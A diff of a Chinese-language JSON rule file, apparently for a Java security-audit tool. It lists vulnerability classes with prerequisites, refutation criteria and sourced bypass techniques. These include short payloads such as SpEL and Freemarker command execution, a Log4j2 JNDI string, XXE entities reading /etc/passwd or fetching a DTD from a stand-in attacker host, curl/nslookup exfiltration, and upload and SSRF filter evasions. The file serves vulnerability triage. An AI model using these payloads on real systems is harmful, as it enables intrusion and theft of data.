+      "references": "OWASP Deserialization Cheat Sheet；各组件官方安全公告（fastjson / Jackson / SnakeYAML / XStream）"
     },
     {
       "id": "jndi",
       "name": "JNDI 注入",
       "trigger": "地址可控的 lookup 调用，可指向攻击者控制的 LDAP / RMI 服务",
+      "prerequisites": [
+        "lookup 的地址或名称可被外部输入影响",
+        "目标可出网或能访问攻击者控制的服务",
+        "JDK 版本 / 信任配置允许远程 codebase 或存在本地工厂利用点"
+      ],
+      "refutations": [
+        "地址来自配置常量且不可控",
+        "目标禁止出网且本地无可用工厂类",
+        "已限制远程 codebase（JDK 8u191+ 默认限制）且无本地绕过"
+      ],
       "bypasses": [
-        "协议：ldap、ldaps、rmi、iiop、dns（外带）；高版本 JDK 禁远程 codebase 后改用 ldaps 或本地工厂",
-        "本地工厂绕过：Tomcat BeanFactory + org.apache.naming.factory.BeanFactory 配合 forceString，不下载远程类即可 EL / 命令执行",
-        "大小写与编码：lDaP、%6c%64%61%70、插入制表符 / 换行绕过关键字匹配",
-        "前缀注入：Log4j2 场景用 ${jndi:...}；字符串拼接绕过对 `jndi:` 的静态检测",
-        "白名单绕过：把地址写在拼接到 lookup 的参数里，用重定向或 DNS 重绑定改指向"
-      ]
+        {
+          "text": "协议选择：ldap、ldaps、rmi、iiop、dns（外带）",
+          "source": "Oracle JNDI 官方文档",
+          "appliesTo": "全版本",
+          "requires": "lookup 参数可控且出网可达",
+          "tags": [
+            "generic"
+          ]
+        },
+        {
+          "text": "本地工厂绕过：Tomcat BeanFactory + org.apache.naming.factory.BeanFactory 配合 forceString，不下载远程类即可触发 EL / 命令执行",
+          "source": "公开 Tomcat BeanFactory 研究",
+          "appliesTo": "classpath 上存在 Tomcat 相关依赖",
+          "requires": "目标能加载 org.apache.naming.factory.BeanFactory",
+          "tags": [
+            "tomcat"
+          ]
+        },
+        {
+          "text": "大小写与编码：lDaP、%6c%64%61%70、插入制表符 / 换行绕过关键字匹配",
+          "source": "OWASP 通用绕过手法",
+          "appliesTo": "只做关键字黑名单校验的场景",
+          "requires": "协议名进入 lookup 前未被统一规范化",
+          "tags": [
+            "generic"
+          ]
+        },
+        {
+          "text": "前缀注入：Log4j2 场景用 ${jndi:...}；字符串拼接绕过对 jndi: 的静态检测",
+          "source": "CVE-2021-44228 公开公告",
+          "appliesTo": "Log4j2 2.0-beta9 ~ 2.14.1",
+          "requires": "外部数据进入日志记录路径",
+          "tags": [
+            "log4j2"
+          ]
+        },
+        {
+          "text": "白名单绕过：把地址放在拼接到 lookup 的参数里，用重定向或 DNS 重绑定改指向",
+          "source": "OWASP SSRF / JNDI 研究",
+          "appliesTo": "存在域名白名单校验的场景",
+          "requires": "校验发生在请求之前且未固定解析结果",
+          "tags": [
+            "generic"
+          ]
+        }
+      ],
+      "applicable": "使用 javax.naming 做查找的场景：Log4j2 lookup、JNDI 数据源配置、RMI / LDAP 客户端",
+      "references": "CVE-2021-44228（Log4Shell）公开公告；Oracle JNDI 官方文档；blackhat JNDI 利用研究"
     },
     {
       "id": "expression",
       "name": "表达式注入",
       "trigger": "外部输入进入 OGNL / SpEL / MVEL / 脚本引擎的求值入口",
+      "prerequisites": [
+        "表达式串可被外部输入影响",
+        "求值上下文未禁用危险特性（如静态方法调用）",
+        "没有对输入做语法白名单限制"
+      ],
+      "refutations": [
+        "表达式为固定常量或来自可信配置",
+        "求值上下文已限制可用类 / 方法（沙箱生效）",
+        "输入经过严格的字面量白名单校验"
+      ],
       "bypasses": [
-        "SpEL：T(java.lang.Runtime).getRuntime().exec(\"id\")；被拦时改 ProcessBuilder 或反射 forName",
-        "OGNL：Struts2 下先 #_memberAccess[\"allowStaticMethodAccess\"]=true 再调用静态方法",
-        "关键字绕过：字符串拼接（\"Ru\"+\"ntime\"）、Class.forName、Unicode 转义、大小写混合",
-        "沙箱逃逸：通过 #context 取到 ClassLoader，再用 defineClass 投递字节码"
-      ]
+        {
+          "text": "SpEL：T(java.lang.Runtime).getRuntime().exec(\"id\")；被拦时改 ProcessBuilder 或反射 forName",
+          "source": "Spring SpEL 官方文档",
+          "appliesTo": "Spring 表达式求值入口",
+          "requires": "表达式字符串外部可控",
+          "tags": [
+            "spel"
+          ]
+        },
+        {
+          "text": "OGNL：Struts2 下先 #_memberAccess[\"allowStaticMethodAccess\"]=true 再调用静态方法",
+          "source": "Struts2 S2-xxx 系列安全公告",
+          "appliesTo": "Struts2 受影响版本",
+          "requires": "参数进入了 OGNL 求值而非仅作为数据",
+          "tags": [
+            "struts2"
+          ]
+        },
+        {
+          "text": "关键字绕过：字符串拼接（\"Ru\"+\"ntime\"）、Class.forName、Unicode 转义、大小写混合",
+          "source": "OWASP 通用绕过手法",
+          "appliesTo": "仅做关键字黑名单的场景",
+          "requires": "黑名单未覆盖拼接后的运行时形态",
+          "tags": [
+            "generic"
+          ]
+        },
+        {
+          "text": "沙箱逃逸：通过 #context 取到 ClassLoader，再用 defineClass 投递字节码",
+          "source": "公开 OGNL 沙箱研究",
+          "appliesTo": "存在表达式沙箱的场景",
+          "requires": "沙箱允许访问 ClassLoader 相关属性",
+          "tags": [
+            "generic"
+          ]
+        }
+      ],
+      "applicable": "SpEL（Spring）、OGNL（Struts2）、MVEL、JEXL 等把外部字符串当表达式求值的场景",
+      "references": "Spring SpEL 官方文档；Struts2 OGNL 安全公告（S2-xxx 系列）"
     },
     {
       "id": "template",
       "name": "服务端模板注入",
       "trigger": "外部输入进入模板引擎的求值路径（SSTI）",
+      "prerequisites": [
+        "模板内容可被外部输入影响（非固定模板文件）",
+        "模板引擎版本受已知 SSTI 影响且未启用沙箱"
+      ],
+      "refutations": [
+        "模板来自工程自带资源且变量只做替换",
+        "启用了引擎沙箱或禁用危险内置对象",
+        "仅输出而无表达式求值能力"
+      ],
       "bypasses": [
-        "Freemarker：<#assign v=\"freemarker.template.utility.Execute\"?new()>${v(\"id\")}，或用 ObjectConstructor",
-        "Velocity：#set($x=$class.inspect(\"java.lang.Runtime\").type) 取到 Class 再反射",
-        "Thymeleaf：用 __${...}__::.x 让表达式进入预处理阶段，绕过对普通表达式的过滤",
-        "绕过：?api / ?eval 内置函数、关键字拼接、把 payload 拆成多段变量再拼"
-      ]
+        {
+          "text": "Freemarker：<#assign v=\"freemarker.template.utility.Execute\"?new()>${v(\"id\")}，或用 ObjectConstructor",
+          "source": "Freemarker 官方文档与公开研究",
+          "appliesTo": "Freemarker",
+          "requires": "模板内容或模板变量可控",
+          "tags": [
+            "freemarker"
+          ]
+        },
+        {
+          "text": "Velocity：#set($x=$class.inspect(\"java.lang.Runtime\").type) 取到 Class 再反射",
+          "source": "Velocity 官方文档",
+          "appliesTo": "Velocity",
+          "requires": "允许在模板中访问 $class",
+          "tags": [
+            "velocity"
+          ]
+        },
+        {
+          "text": "Thymeleaf：用 __${...}__::.x 让表达式进入预处理阶段，绕过对普通表达式的过滤",
+          "source": "Thymeleaf 官方文档与公开研究",
+          "appliesTo": "Thymeleaf",
+          "requires": "片段表达式被求值而非作为静态文本",
+          "tags": [
+            "thymeleaf"
+          ]
+        },
+        {
+          "text": "绕过：?api / ?eval 内置函数、关键字拼接、把 payload 拆成多段变量再拼",
+          "source": "OWASP 通用绕过手法",
+          "appliesTo": "存在关键字过滤的模板场景",
+          "requires": "过滤只作用于字面量而未覆盖求值结果",
+          "tags": [
+            "generic"
+          ]
+        }
+      ],
+      "applicable": "Freemarker / Velocity / Thymeleaf / Pebble 等模板引擎且模板内容或变量受外部影响",
+      "references": "PortSwigger 服务端模板注入研究；各模板引擎官方文档"
     },
     {
       "id": "command",
       "name": "命令执行",
       "trigger": "命令或参数可控地进入 Runtime.exec / ProcessBuilder / 脚本引擎",
+      "prerequisites": [
+        "存在从外部入口到该命令执行点的调用路径",
+        "命令串或参数可被外部输入影响（非硬编码常量）",
+        "没有强制白名单 / 命令模板限制可执行内容"
+      ],
+      "refutations": [
+        "命令串为编译期常量且不接受外部参数",
+        "调用前做了白名单校验或命令模板限定",
+        "该代码路径在任何配置下都不可达（如仅测试用例引用）"
+      ],
       "bypasses": [
-        "Java 层差异：Runtime.exec 不走 shell，需显式 sh -c；ProcessBuilder 传数组时不解析元字符（先确认再下结论）",
-        "空格绕过的 shell 手法：${IFS}、$IFS$9、%09、<、重定向",
-        "关键字绕过：c\"\"at、c\\at、环境变量拼接、base64 解码后交给 sh",
-        "无回显外带：curl / nslookup 把结果带出，或写入 web 目录后再读"
-      ]
+        {
+          "text": "Java 层差异：Runtime.exec 不走 shell，需显式 sh -c；ProcessBuilder 传数组时不解析元字符（先确认再下结论）",
+          "source": "JDK 官方文档（Runtime.exec / ProcessBuilder）",
+          "appliesTo": "全版本 Java",
+          "requires": "确认目标调用的是哪一个 API，否则绕用手法无效",
+          "tags": [
+            "generic"
+          ]
+        },
+        {
+          "text": "空格绕过的 shell 手法：${IFS}、$IFS$9、%09、<、重定向",
+          "source": "OWASP Command Injection Cheat Sheet",
+          "appliesTo": "命令确实经过 shell 的场景",
+          "requires": "目标把字符串交给 shell 解析，而非数组式 exec",
+          "tags": [
+            "shell"
+          ]
+        },
+        {
+          "text": "关键字绕过：c\"\"at、c\\at、环境变量拼接、base64 解码后交给 sh",
+          "source": "OWASP Command Injection Cheat Sheet",
+          "appliesTo": "存在命令关键字黑名单的场景",
+          "requires": "shell 可用且未被替换函数过滤",
+          "tags": [
+            "shell"
+          ]
+        },
+        {
+          "text": "无回显外带：curl / nslookup 把结果带出，或写入 web 目录后再读",
+          "source": "公开无回显利用研究",
+          "appliesTo": "无回显的命令执行点",
+          "requires": "目标具备出网能力或存在可写且可访问的 web 目录",
+          "tags": [
+            "generic"
+          ]
+        }
+      ],
+      "applicable": "Runtime.exec / ProcessBuilder / ScriptEngine 等把外部数据拼进命令或脚本的场景",
+      "references": "OWASP Command Injection Cheat Sheet；JDK ProcessBuilder 与 Runtime 官方文档"
     },
     {
       "id": "codegen",
       "name": "代码执行（类加载 / 字节码）",
       "trigger": "可控字节码或类名进入类加载与实例化路径",
+      "prerequisites": [
+        "字节码来源可控（上传、网络下载、数据库字段）",
+        "类名 / 字节数组确实来自外部输入",
+        "类加载器没有签名或来源校验"
+      ],
+      "refutations": [
+        "字节码来自本工程自带资源（如固定模板类）",
+        "加载前校验了签名 / 摘要",
+        "使用受限类加载器且不接受远程来源"
+      ],
       "bypasses": [
-        "TemplatesImpl：把字节码放进 _bytecodes 后触发 newTransformer / getOutputProperties",
-        "BCEL：类名以 $$BCEL$$ 开头，直接交给 BCEL ClassLoader 加载字节码",
-        "defineClass：直接投递字节码，中间层若校验 class 文件头可用 - 前缀一类手法绕过",
-        "URLClassLoader：远程 jar + loadClass；高版本 JDK 会拒绝远程 codebase，需改本地投递"
-      ]
+        {
+          "text": "TemplatesImpl：把字节码放进 _bytecodes 后触发 newTransformer / getOutputProperties",
+          "source": "公开 TemplatesImpl 利用研究",
+          "appliesTo": "JDK 自带 Xalan 且可反射设字段",
+          "requires": "能构造该对象并触发其 getter / 方法",
+          "tags": [
+            "templatesimpl"
+          ]
+        },
+        {
+          "text": "BCEL：类名以 $$BCEL$$ 开头，直接交给 BCEL ClassLoader 加载字节码",
+          "source": "公开 BCEL 利用研究",
+          "appliesTo": "classpath 上存在 BCEL 或 JDK8 自带",
+          "requires": "类名字符串可控且会走到 ClassLoader.loadClass",
+          "tags": [
+            "bcel"
+          ]
+        },
+        {
+          "text": "defineClass：直接投递字节码，中间层若校验 class 文件头可用 - 前缀一类手法绕过",
+          "source": "JVM 类文件规范与公开研究",
+          "appliesTo": "存在字节码投递入口的场景",
+          "requires": "字节码来源可控",
+          "tags": [
+            "generic"
+          ]
+        },
+        {
+          "text": "URLClassLoader：远程 jar + loadClass；高版本 JDK 会拒绝远程 codebase，需改本地投递",
+          "source": "JDK 官方文档（URLClassLoader）",
+          "appliesTo": "JDK 8u191 起远程 codebase 默认受限",
+          "requires": "目标版本允许远程加载，否则改用本地文件或 JNDI 工厂",
+          "tags": [
+            "urlclassloader"
+          ]
+        }
+      ],
+      "applicable": "动态类加载与字节码投递：defineClass、URLClassLoader、TemplatesImpl、BCEL、脚本引擎",
+      "references": "TemplatesImpl / BCEL 公开利用研究；JDK ClassLoader 官方文档"
     },
     {
       "id": "ssrf",
       "name": "SSRF",
       "trigger": "URL 或主机名可控地进入网络请求路径",
+      "prerequisites": [
+        "目标地址可被外部输入部分或全部影响",
+        "服务端能发起出网请求（或可访问内网）",
+        "没有严格的地址 / 协议白名单"
+      ],
+      "refutations": [
+        "地址来自配置常量，或只允许白名单内域名",
+        "解析后校验了 IP 且禁止内网段",
+        "仅使用固定协议且禁止跳转"
+      ],
       "bypasses": [
-        "地址变形：0.0.0.0、127.1、2130706433（十进制）、0177.0.0.1（八进制）、[::1]、去掉点",
-        "DNS 重绑定与 302 跳转：先通过白名单校验，再改指向内网",
-        "协议：gopher:// 打内网服务、file:// 读文件、dict://",
-        "请求头注入：Host、X-Forwarded-For 影响后端路由"
-      ]
+        {
+          "text": "地址变形：0.0.0.0、127.1、2130706433（十进制）、0177.0.0.1（八进制）、[::1]、去掉点",
+          "source": "OWASP SSRF Cheat Sheet",
+          "appliesTo": "仅做字符串匹配的地址校验",
+          "requires": "校验未做规范化与 DNS 解析后比对",
+          "tags": [
+            "generic"
+          ]
+        },
+        {
+          "text": "DNS 重绑定与 302 跳转：先通过白名单校验，再改指向内网",
+          "source": "OWASP SSRF Cheat Sheet",
+          "appliesTo": "白名单按域名判定",
+          "requires": "服务端在校验之后重新解析域名",
+          "tags": [
+            "generic"
+          ]
+        },
+        {
+          "text": "协议：gopher:// 打内网服务、file:// 读文件、dict://",
+          "source": "公开 SSRF 协议研究",
+          "appliesTo": "允许任意协议且未限制 scheme",
+          "requires": "客户端支持该协议且未做 scheme 白名单",
+          "tags": [
+            "generic"
+          ]
+        },
+        {
+          "text": "请求头注入：Host、X-Forwarded-For 影响后端路由",
+          "source": "OWASP 通用手法",
+          "appliesTo": "存在反代或按头路由的场景",
+          "requires": "后端信任这些头而未做校验",
+          "tags": [
+            "generic"
+          ]
+        }
+      ],
+      "applicable": "服务端代发起请求：URL.openConnection / HttpClient / RestTemplate 等且目标地址受外部影响",
+      "references": "OWASP SSRF Cheat Sheet；RFC 3986（URL 语法）"
     },
     {
       "id": "sqli",
       "name": "SQL 注入",
       "trigger": "外部输入拼接进 SQL 语句",
+      "prerequisites": [
+        "SQL 语句由字符串拼接构造且含外部输入",
+        "没有使用预编译参数绑定"
+      ],
+      "refutations": [
+        "使用 PreparedStatement 且参数全部绑定",
+        "输入经过严格类型转换（如强制 int）",
+        "该语句只在初始化阶段执行且不含外部输入"
+      ],
       "bypasses": [
-        "关键字绕过：/**/ 替代空格、%09、大小写混合、UNION/**/SELECT",
-        "编码：宽字节（GBK）、Unicode、二次编码、URL 编码嵌套",
-        "盲注：布尔（and 1=1）、时间（SLEEP / BENCHMARK / WAITFOR DELAY）",
-        "堆叠查询：分号分隔多语句，是否可行取决于驱动与数据库配置"
-      ]
+        {
+          "text": "关键字绕过：/**/ 替代空格、%09、大小写混合、UNION/**/SELECT",
+          "source": "OWASP SQL Injection Cheat Sheet",
+          "appliesTo": "存在 SQL 关键字过滤的场景",
+          "requires": "拼接点未参数化",
+          "tags": [
+            "generic"
+          ]
+        },
+        {
+          "text": "编码：宽字节（GBK）、Unicode、二次编码、URL 编码嵌套",
+          "source": "公开 SQL 注入编码绕过研究",
+          "appliesTo": "数据库字符集为 GBK 等多字节编码",
+          "requires": "转义与字符集解码顺序存在不一致",
+          "tags": [
+            "generic"
+          ]
+        },
+        {
+          "text": "盲注：布尔（and 1=1）、时间（SLEEP / BENCHMARK / WAITFOR DELAY）",
+          "source": "OWASP SQL Injection Cheat Sheet",
+          "appliesTo": "无回显的注入点",
+          "requires": "可观测响应差异或时间差",
+          "tags": [
+            "generic"
+          ]
+        },
+        {
+          "text": "堆叠查询：分号分隔多语句，是否可行取决于驱动与数据库配置",
+          "source": "各数据库官方文档",
+          "appliesTo": "MySQL（默认关闭）/ SQL Server / PostgreSQL",
+          "requires": "驱动与数据库允许一次执行多条语句",
+          "tags": [
+            "generic"
+          ]
+        }
+      ],
+      "applicable": "拼接 SQL 的 Statement / 动态 Order By / Like 等，且参数外部可控",
+      "references": "OWASP SQL Injection Cheat Sheet；各数据库官方文档"
     },
     {
       "id": "path",
       "name": "路径穿越 / 任意文件读写",
       "trigger": "路径或文件名可控地进入文件读写与解压路径",
+      "prerequisites": [
+        "文件路径可由外部输入部分或全部影响",
+        "没有规范化后校验（或校验在拼接之前）"
+      ],
+      "refutations": [
+        "路径来自固定白名单映射",
+        "规范化后校验了前缀且拒绝越权路径",
+        "仅操作固定文件名，外部输入只用于选择白名单内项"
+      ],
       "bypasses": [
-        "编码绕过：%2e%2e%2f、..%c0%af（宽字节）、....//、Windows 下 ..\\",
-        "绝对路径：直接传 /etc/passwd 或 C:\\Windows\\win.ini，绕过目录前缀拼接",
-        "规范化差异：normalize 与 getCanonicalPath 结果不同，可绕开基于字符串的前缀判断",
-        "Zip Slip：解压时 ZipEntry 名带 ../，写到目标目录之外"
-      ]
+        {
+          "text": "编码绕过：%2e%2e%2f、..%c0%af（宽字节）、....//、Windows 下 ..\\",
+          "source": "OWASP Path Traversal 文档",
+          "appliesTo": "存在路径前缀拼接的场景",
+          "requires": "解码发生在路径拼接之后",
+          "tags": [
+            "generic"
+          ]
+        },
+        {
+          "text": "绝对路径：直接传 /etc/passwd 或 C:\\Windows\\win.ini，绕过目录前缀拼接",
+          "source": "OWASP Path Traversal 文档",
+          "appliesTo": "使用字符串拼接构造路径",
+          "requires": "未丢弃外部传入的绝对路径",
+          "tags": [
+            "generic"
+          ]
+        },
+        {
+          "text": "规范化差异：normalize 与 getCanonicalPath 结果不同，可绕开基于字符串的前缀判断",
+          "source": "JDK 官方文档（File.getCanonicalPath）",
+          "appliesTo": "使用字符串前缀校验的场景",
+          "requires": "校验所用方法与实际打开文件所用方法不一致",
+          "tags": [
+            "generic"
+          ]
+        },
+        {
+          "text": "Zip Slip：解压时 ZipEntry 名带 ../，写到目标目录之外",
+          "source": "OWASP Zip Slip 公告",
+          "appliesTo": "解压外部压缩包的场景",
+          "requires": "解压时未校验条目路径",
+          "tags": [
+            "zip"
+          ]
+        }
+      ],
+      "applicable": "按外部传入的路径做文件读写、上传落盘、解压落盘",
+      "references": "OWASP Path Traversal 文档；OWASP Zip Slip 公告"
     },
     {
       "id": "xxe",
       "name": "XXE",
       "trigger": "XML 解析未禁用外部实体",
+      "prerequisites": [
+        "XML 解析器未禁用外部实体",
+        "XML 内容可被外部输入控制"
+      ],
+      "refutations": [
+        "解析前设置了禁用 DTD / 外部实体的特性开关",
+        "使用默认安全配置的解析器（如部分新版库）",
+        "输入不是 XML 或仅解析固定结构"
+      ],
       "bypasses": [
-        "外部实体读文件：<!ENTITY xxe SYSTEM \"file:///etc/passwd\">",
-        "带外（OOB）：<!ENTITY % dtd SYSTEM \"http://attacker/e.dtd\">%dtd;，适用于无回显场景",
-        "高版本 JDK 限制：需关闭 disallow-doctype-decl；可用 jar: 或 ftp:// 协议绕过对 http 的限制",
-        "错误外带：用不存在的实体名让报错信息带出文件内容"
-      ]
+        {
+          "text": "外部实体读文件：<!ENTITY xxe SYSTEM \"file:///etc/passwd\">",
+          "source": "OWASP XXE Cheat Sheet",
+          "appliesTo": "未禁用外部实体的解析器",
+          "requires": "XML 内容可控且 DTD 处理未关闭",
+          "tags": [
+            "generic"
+          ]
+        },
+        {
+          "text": "带外（OOB）：<!ENTITY % dtd SYSTEM \"http://attacker/e.dtd\">%dtd;，适用于无回显场景",
+          "source": "OWASP XXE Cheat Sheet",
+          "appliesTo": "无回显且可出网的解析点",
+          "requires": "允许参数实体且目标可出网",
+          "tags": [
+            "generic"
+          ]
+        },
+        {
+          "text": "高版本 JDK 限制：需关闭 disallow-doctype-decl；可用 jar: 或 ftp:// 协议绕过对 http 的限制",
+          "source": "JDK 官方安全说明与公开研究",
+          "appliesTo": "JDK 高版本（默认加固的解析器）",
+          "requires": "目标使用了受影响的解析器且未显式加固",
+          "tags": [
+            "generic"
+          ]
+        },
+        {
+          "text": "错误外带：用不存在的实体名让报错信息带出文件内容",
+          "source": "OWASP XXE Cheat Sheet",
+          "appliesTo": "错误信息会回显给调用方",
+          "requires": "异常未被统一吞掉",
+          "tags": [
+            "generic"
+          ]
+        }
+      ],
+      "applicable": "以 DocumentBuilder / SAXReader / XMLReader 解析外部 XML 且未禁用 DTD 与外部实体",
+      "references": "OWASP XXE Cheat Sheet；XML 1.0 规范"
     },
     {
       "id": "upload",
       "name": "文件上传",
       "trigger": "可上传可执行后缀或可被解析的内容",
+      "prerequisites": [
+        "上传文件的类型 / 扩展名 / 内容可被外部控制",
+        "落盘目录可执行或可被 Web 直接访问",
+        "没有内容嗅探或重命名策略"
+      ],
+      "refutations": [
+        "强制白名单扩展名 + 服务端重命名",
+        "落盘目录不可执行且不可通过 Web 访问",
+        "落盘后统一做内容类型转换（如图片再编码）"
+      ],
       "bypasses": [
-        "后缀绕过：.jsp;、.jsp%00.png、.jsp.、.jsp::$DATA、大小写 .Jsp、.jspx、.jspf",
-        "内容绕过：Content-Type 改成 image/png、加 GIF89a 魔数后再拼木马",
-        "解析绕过：传 .htaccess / web.config 改解析规则，或用双扩展名",
-        "路径绕过：文件名带 ../ 直接写到 web 目录"
-      ]
+        {
+          "text": "后缀绕过：.jsp;、.jsp%00.png、.jsp.、.jsp::$DATA、大小写 .Jsp、.jspx、.jspf",
+          "source": "OWASP File Upload Cheat Sheet",
+          "appliesTo": "后缀黑名单校验的场景",
+          "requires": "容器解析规则与校验规则不一致",
+          "tags": [
+            "generic"
+          ]
+        },
+        {
+          "text": "内容绕过：Content-Type 改成 image/png、加 GIF89a 魔数后再拼木马",
+          "source": "OWASP File Upload Cheat Sheet",
+          "appliesTo": "仅校验 Content-Type 或魔数",
+          "requires": "落盘后仍会被解析执行",
+          "tags": [
+            "generic"
+          ]
+        },
+        {
+          "text": "解析绕过：传 .htaccess / web.config 改解析规则，或用双扩展名",
+          "source": "Apache / IIS 官方配置文档",
+          "appliesTo": "允许上传配置文件且目录可访问",
+          "requires": "容器读取该配置文件",
+          "tags": [
+            "generic"
+          ]
+        },
+        {
+          "text": "路径绕过：文件名带 ../ 直接写到 web 目录",
+          "source": "OWASP File Upload Cheat Sheet",
+          "appliesTo": "文件名直接参与落盘路径拼接",
+          "requires": "落盘目录位于可访问的 web 路径下",
+          "tags": [
+            "generic"
+          ]
+        }
+      ],
+      "applicable": "存在 multipart 上传、文件名与后缀受外部控制、且落盘目录位于可解析执行范围",
+      "references": "OWASP File Upload Cheat Sheet；RFC 7578"
     },
     {
       "id": "exposure",
       "name": "配置 / 敏感信息暴露",
       "trigger": "对外暴露了可读取配置或触发内部调用的端点",
+      "prerequisites": [
+        "敏感路径可从外部直接访问",
+        "没有鉴权或鉴权可绕过"
+      ],
+      "refutations": [
+        "该路径已被网关或鉴权组件拦截",
+        "仅在开发配置中启用，生产环境已关闭"
+      ],
       "bypasses": [
-        "Actuator：/actuator/env 读环境变量（含凭据）、/actuator/heapdump 下堆、/actuator/refresh 刷新配置",
-        "路径变形绕过：/actuator//env、/;/actuator/env、/actuator/env/、大小写混合",
-        "Spring Cloud Gateway：用 AddResponseHeader + SpEL 组合达成 RCE",
-        "jolokia /jmx 端点：可达即可调用 MBean 方法"
-      ]
+        {
+          "text": "Actuator：/actuator/env 读环境变量（含凭据）、/actuator/heapdump 下堆、/actuator/refresh 刷新配置",
+          "source": "Spring Boot Actuator 官方文档",
+          "appliesTo": "Actuator 端点对外暴露且未鉴权",
+          "requires": "端点已启用且网络可达",
+          "tags": [
+            "actuator"
+          ]
+        },
+        {
+          "text": "路径变形绕过：/actuator//env、/;/actuator/env、/actuator/env/、大小写混合",
+          "source": "公开 Spring 路径绕过研究",
+          "appliesTo": "存在基于前缀的鉴权或网关规则",
+          "requires": "鉴权规则与实际路由匹配方式不一致",
+          "tags": [
+            "actuator"
+          ]
+        },
+        {
+          "text": "Spring Cloud Gateway：用 AddResponseHeader + SpEL 组合达成 RCE",
+          "source": "CVE-2022-22947 公开公告",
+          "appliesTo": "Spring Cloud Gateway 受影响版本",
+          "requires": "Gateway actuator 端点可达",
+          "tags": [
+            "springcloudgateway"
+          ]
+        },
+        {
+          "text": "jolokia /jmx 端点：可达即可调用 MBean 方法",
+          "source": "jolokia 官方文档",
+          "appliesTo": "启用了 jolokia 或 JMX over HTTP",
+          "requires": "端点未鉴权且可写属性",
+          "tags": [
+            "jolokia"
+          ]
+        }
+      ],
+      "applicable": "Spring Actuator / JMX / 调试端点 / 配置读取接口对外可达",
+      "references": "Spring Boot Actuator 官方文档；Spring Cloud Gateway 安全公告"
     },
     {
       "id": "credential",
       "name": "凭据泄露",
       "trigger": "密钥、口令、令牌硬编码在代码或配置里",
+      "prerequisites": [
+        "凭据为有效且在用的值（非示例 / 占位符）",
+        "凭据对应的服务可从当前环境访问"
+      ],
+      "refutations": [
+        "值只是示例、文档或测试占位符",
+        "凭据已轮换或对目标环境无效"
+      ],
       "bypasses": [
-        "反编译即得：常量直接可读",
-        "轻度混淆：Base64 / hex / 字符串拆分拼接，需还原后再判定真伪",
-        "配置外置：application.yml / .properties 里明文，随构建产物一起分发",
-        "判定要点：先确认是真实凭据还是模板占位符，再决定是否升级为高危"
-      ]
+        {
+          "text": "反编译即得：常量直接可读",
+          "source": "本项目分析口径",
+          "appliesTo": "未做混淆的构建产物",
+          "requires": "字符串常量进入分析库",
+          "tags": [
+            "generic"
+          ]
+        },
+        {
+          "text": "轻度混淆：Base64 / hex / 字符串拆分拼接，需还原后再判定真伪",
+          "source": "OWASP Secrets Management Cheat Sheet",
+          "appliesTo": "做过轻度编码的常量",
+          "requires": "人工确认还原结果确为真实凭据",
+          "tags": [
+            "generic"
+          ]
+        },
+        {
+          "text": "配置外置：application.yml / .properties 里明文，随构建产物一起分发",
+          "source": "OWASP Secrets Management Cheat Sheet",
+          "appliesTo": "配置随包分发",
+          "requires": "配置文件进入了分析范围",
+          "tags": [
+            "generic"
+          ]
+        },
+        {
+          "text": "判定要点：先确认是真实凭据还是模板占位符，再决定是否升级为高危",
+          "source": "本项目分析口径",
+          "appliesTo": "全部凭据类命中",
+          "requires": "人工核对上下文",
+          "tags": [
+            "generic"
+          ]
+        }
+      ],
+      "applicable": "代码或配置里内嵌口令、Token、云平台 AccessKey",
+      "references": "OWASP Secrets Management Cheat Sheet"
     },
     {
       "id": "dos",
       "name": "拒绝服务",
       "trigger": "可控输入触发高开销路径",
+      "prerequisites": [
+        "触发点可被外部反复调用",
+        "输入规模 / 复杂度不受限制"
+      ],
+      "refutations": [
+        "有请求限流或输入长度上限",
+        "触发成本远高于攻击收益且不影响服务可用性"
+      ],
       "bypasses": [
-        "正则 ReDoS：嵌套量词 + 超长输入造成回溯爆炸",
-        "超大反序列化数据：内存与 CPU 双杀，也常用于掩盖其它动作",
-        "畸形数字 / 日期解析：BigDecimal、日期格式化对超长串开销极大",
-        "压缩炸弹：zip / gzip 解压比极高，落盘前即耗尽磁盘"
-      ]
+        {
+          "text": "正则 ReDoS：嵌套量词 + 超长输入造成回溯爆炸",
+          "source": "OWASP ReDoS 文档",
+          "appliesTo": "使用嵌套量词的正则且输入可控",
+          "requires": "输入长度不受限",
+          "tags": [
+            "generic"
+          ]
+        },
+        {
+          "text": "超大反序列化数据：内存与 CPU 双杀，也常用于掩盖其它动作",
+          "source": "OWASP Deserialization Cheat Sheet",
+          "appliesTo": "反序列化入口未限制大小",
+          "requires": "请求体大小未受限",
+          "tags": [
+            "generic"
+          ]
+        },
+        {
+          "text": "畸形数字 / 日期解析：BigDecimal、日期格式化对超长串开销极大",
+          "source": "JDK 官方文档（BigDecimal / DateTimeFormatter）",
+          "appliesTo": "把外部字符串交给高开销解析器",
+          "requires": "长度未做上限校验",
+          "tags": [
+            "generic"
+          ]
+        },
+        {
+          "text": "压缩炸弹：zip / gzip 解压比极高，落盘前即耗尽磁盘",
+          "source": "OWASP 压缩炸弹文档",
+          "appliesTo": "解压外部压缩包的场景",
+          "requires": "解压前未校验大小或条目数",
+          "tags": [
+            "zip"
+          ]
+        }
+      ],
+      "applicable": "外部可控的正则、超大反序列化数据、压缩包解压、超长数字与日期解析",
+      "references": "OWASP ReDoS 文档；各压缩库官方文档"
     }
-  ]
+  ],
+  "ruleVersion": "2026.09.1",
+  "maintained": "2026-09-23",
+  "governance": "每条特征与每条绕过手法都必须登记来源（source）与适用范围；新增规则必须同时补正例、负例与边界用例，见 tests/test_signatures.py。特征 id 一经发布不复用：修改语义时新增 id，避免历史结论与规则对不上。"
 }
